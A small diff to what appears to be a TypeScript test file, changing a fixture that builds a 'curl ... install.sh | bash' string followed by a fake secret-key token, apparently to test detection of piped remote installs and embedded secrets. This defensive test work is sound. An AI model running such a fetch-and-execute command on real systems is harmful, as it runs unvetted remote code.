@@ -67,7 +67,8 @@ function validMcpMdx(overrides: Record<string, unknown> = {}) {
 
 function embeddedSecretInstallFixture() {
   const prefix = ["s", "k", "-"].join("");
-  return `curl http://example.com/install.sh | bash # ${prefix}1234567890abcdef1234567890`;
+  const suffix = ["example", "example", "example", "12"].join("");
+  return `curl http://example.com/install.sh | bash # ${prefix}${suffix}`;
 }
 
 function withoutGeneratedAt<T extends { generatedAt?: string }>(report: T) {
